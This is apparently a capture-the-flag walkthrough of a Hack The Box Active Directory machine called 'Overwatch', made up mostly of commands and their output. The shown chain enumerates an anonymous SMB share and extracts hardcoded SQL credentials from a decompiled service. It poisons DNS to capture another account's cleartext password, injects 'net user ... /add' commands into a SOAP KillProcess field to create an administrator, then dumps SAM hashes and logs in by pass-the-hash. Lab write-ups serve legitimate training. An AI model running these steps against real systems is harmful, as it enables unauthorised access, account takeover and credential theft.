------------------------------------------------------------------------------------------OVERWATCHNOTES------------------------------------------------------------------------------------


Step 1:- Reconnaissance


nmap -A -sS -P -T4  --min-rate 5000 10.129.12.253
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-26 13:38 UTC
Nmap scan report for 10.129.12.253
Host is up (0.27s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  tcpwrapped
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-26 13:37:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-26T13:38:43+00:00; -47s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-26T13:38:03+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-26T13:38:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -47s, deviation: 0s, median: -47s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   264.70 ms 10.10.14.1
2   266.87 ms 10.129.12.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done


[*]An Active Directory Environment.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------




Step-2:- Enumeration 

[*] First Lets look at the SMB service, if it has NULL Session Allowed or not

smbclient -L 10.129.12.253 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        software$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.12.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


Interesting, the NULL session is allowed, so we can access the custom share.


[*] Lets look what this 'software$' custom share got for us


	smbclient \\\\10.129.12.253\\software$ -N


mb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 01:32:43 2025
  ..                                 DH        0  Sat May 17 01:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 20:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 20:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 20:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 20:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 14:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 01:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 01:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 01:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 20:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 20:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 20:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 18:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 14:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 14:46:10 2017
  x64                                DH        0  Sat May 17 01:32:33 2025
  x86                                DH        0  Sat May 17 01:32:33 2025


we are in, and i can se some service files, marked as some monitor service.

[*] Well i enumerated all the files but got nothing interesting, except one thing, a internal HTTP service running at port 8000 "http://overwatch.htb:8000/MonitoringService", so can't access it 


[*] Lets try to Decompile the overwatch.exe file, lets see if we can get something


ilspycmd -p -o decompiled overwatch.exe


 ls -la decompiled
total 36
drwxr-xr-x 3 root root 4096 Jan 27 07:22 .
drwxr-xr-x 5 root root 4096 Jan 27 07:32 ..
-rw-r--r-- 1 root root 2163 Jan 26 13:53 app.config
-rw-r--r-- 1 root root   36 Jan 27 07:22 Creds
-rw-r--r-- 1 root root  245 Jan 27 07:14 IMonitoringService.cs
-rw-r--r-- 1 root root 3911 Jan 27 07:14 MonitoringService.cs
-rw-r--r-- 1 root root  995 Jan 27 07:14 overwatch.csproj
-rw-r--r-- 1 root root 2586 Jan 27 07:14 Program.cs
drwxr-xr-x 2 root root 4096 Jan 27 07:14 Properties



[*] Lets take a look at Program.cs

using System;
using System.Data.Common;
using System.Data.SQLite;
using System.Data.SqlClient;
using System.IO;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Timers;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		ServiceHost val = new ServiceHost(typeof(MonitoringService), Array.Empty<Uri>());
		((CommunicationObject)val).Open();
		Console.WriteLine("Service is running...");
		Timer timer = new Timer(30000.0);
		timer.Elapsed += CheckEdgeHistory;
		timer.Start();
		Console.WriteLine("Press Enter to exit...");
		Console.ReadLine();
		((CommunicationObject)val).Close();
	}

	private static void CheckEdgeHistory(object sender, ElapsedEventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\History");
		if (!File.Exists(text))
		{
			return;
		}
		string tempFileName = Path.GetTempFileName();
		File.Copy(text, tempFileName, overwrite: true);
		try
		{
			SqlConnection val = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");
			try
			{
				((DbConnection)(object)val).Open();
				SqlCommand val2 = new SqlCommand();
				try
				{
					val2.Connection = val;
					SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;");
					sQLiteConnection.Open();
					SQLiteDataReader sQLiteDataReader = new SQLiteCommand("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5", sQLiteConnection).ExecuteReader();
					while (sQLiteDataReader.Read())
					{
						string text2 = sQLiteDataReader["url"].ToString();
						string commandText = "INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '" + text2 + "')";
						((DbCommand)(object)val2).CommandText = commandText;
						((DbCommand)(object)val2).ExecuteNonQuery();
					}
					sQLiteConnection.Close();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		finally
		{
			File.Delete(tempFileName);
		}
	}
}



[*] As Expected, found Creds for user SQLSVC

Username: sqlsvc
Password: TI0LKcfHzZw1Vv


[*] Lets Try to look for the ms-sql service, so we can get the sql shell

nmap -p 1433 10.129.13.149
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 14:33 UTC
Nmap scan report for 10.129.13.149
Host is up (0.24s latency).

PORT     STATE    SERVICE
1433/tcp filtered ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
         

well the usual port is in filtered state, then there must be a custom port



[*] While Enumerating i have found a port 

nmap -sV -p 6520 10.129.13.225  


Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 14:06 UTC
Nmap scan report for overwatch.htb (10.129.13.225)
Host is up (0.27s latency).

PORT     STATE SERVICE  VERSION
6520/tcp open  ms-sql-s Microsoft SQL Server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6520-TCP:V=7.94SVN%I=7%D=1/27%Time=6978C6BA%P=x86_64-pc-linux-gnu%r
SF:(ms-sql-s,25,"\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0
SF:\x1c\0\x01\x03\0\x1d\0\0\xff\x10\0\x03\xe8\0\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.77 seconds


The ms-sql Service is running at port 6520.


[#] impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.13.149' -port 6520 -windows-auth

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.

SQL (OVERWATCH\sqlsvc  guest@master)> 


[*] Well, while Enumerating, i couldn't find anything interesting, it is not a sysadmin, and can't enable xp_cmdshell, as well as no user to impersonate with

[*] However we can do DNS Poisoning 

DNS Poisoning Attack to Capture Credentials

Context:
From the decompiled MonitoringService.cs, we saw a linked server SQL07 in the MSSQL instance.
When a linked server is accessed (e.g., EXEC ('SELECT 1') AT [SQL07]), SQL Server attempts to authenticate to that remote server using Windows authentication (NTLM).

If SQL07 doesn’t exist or DNS is poisoned to point to our IP, the authentication attempt goes to us, and we can capture the NTLM hash (or sometimes cleartext credentials depending on protocol).


[*] While Listing the Links, we can see there is SQL07, so we can trigger it to capture the creds

[*] Before that we need to add a DNS record for this Link which points to our IP 

[*] And then will trigger it to capture the Creds


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------




Step-3:- Initial Foothold


[*] Lets First Add the DNS record

python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -d YOUR_IP -t A -a add 10.129.13.225

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully



[*] Now Lets Run The Responder

responder -I tun0 -w 


[+] Current Session Variables:
    Responder Machine Name     [WIN-JMY2UQPWD24]
    Responder Domain Name      [4XLB.LOCAL]
    Responder DCE-RPC Port     [45360]

[+] Listening for events...  




[*] Lets Trigger The Link now

SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07

INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.


[*] Got Creds


[MSSQL] Cleartext Client   : 10.129.13.149
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx


USER: sqlmgmt
PASS: bIhBbzMMnB82yx



[*] Now Lets see if we can access Evil-winrm, well obviously we cam, because while enumerating i have seen that sqlmgmt is in Remote Management Group

crackmapexec winrm 10.129.13.149 -u sqlmgmt -p bIhBbzMMnB82yx


SMB         10.129.13.149   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
HTTP        10.129.13.149   5985   S200401          [*] http://10.129.13.149:5985/wsman
WINRM       10.129.13.149   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)


[*] Acquire the User Flag

evil-winrm -i 10.129.13.149 -u sqlmgmt -p bIhBbzMMnB82yx
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                           
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                      
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..
*Evil-WinRM* PS C:\Users\sqlmgmt> cd Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> ls


    Directory: C:\Users\sqlmgmt\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/26/2026   7:46 AM             34 user.txt



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Step-4:- Privilege Escalation 


[*] While Running WinPEASE, could not found anything useful 


[*] From decompiled code, MonitoringService.KillProcess method ran:

	Stop-Process -Name <processName> -Force


No input sanitization → command injection via processName parameter.

Service ran as SYSTEM (confirmed via Get-Service).


[*] Sent SOAP request to http://localhost:8000/MonitorService with payload:

	fake|net user pwn Password123! /add|net localgroup administrators pwn /add

[*] Then Once The User is Added, we can dump secrets 



[#]Execution:- 


[*] Lets First Craft a XML body to be sent.(In the WinRM Shell)

$Body = @'
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:KillProcess>
         <tem:processName>fake|net user pwn Password123! /add|net localgroup administrators pwn /add</tem:processName>
      </tem:KillProcess>
   </soapenv:Body>
</soapenv:Envelope>
'@


Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService" -Method POST -ContentType "text/xml" -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} -Body $Body -UseBasicParsing



[*] Then Check If the User is Added or not

Evil-WinRM* PS C:\Users\sqlmgmt\Documents> net user pwn


User name                    pwn
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/27/2026 10:02:09 PM
Password expires             3/10/2026 10:02:09 PM
Password changeable          1/28/2026 10:02:09 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.


[*] Great, User is Added, lets dump the hashes now


impacket-secretsdump 'overwatch.htb/pwn:Password123!@10.129.14.2'


Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2aabc1e8bc70fdfc93ffebecf0f15993
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:269fa056205bbf5d47fc2c3682dbbce6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OVERWATCH\S200401$:aes256-cts-hmac-sha1-96:f4a09677df6d6dafda711e41636c86b4ca081fc22933e1b1537512071212f855


We have Got the Admin ntlm hash


[*] Lets Get Evil-WinRM shell, and Root Flag


evil-winrm -i 10.129.14.2 -u Administrator -H 269fa056205bbf5d47fc2c3682dbbce6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                       
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/16/2025   5:00 PM           2308 Microsoft Edge.lnk
-ar---         1/27/2026   5:35 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt

e111f**********************



********************************************************************************************************************************************************************************************




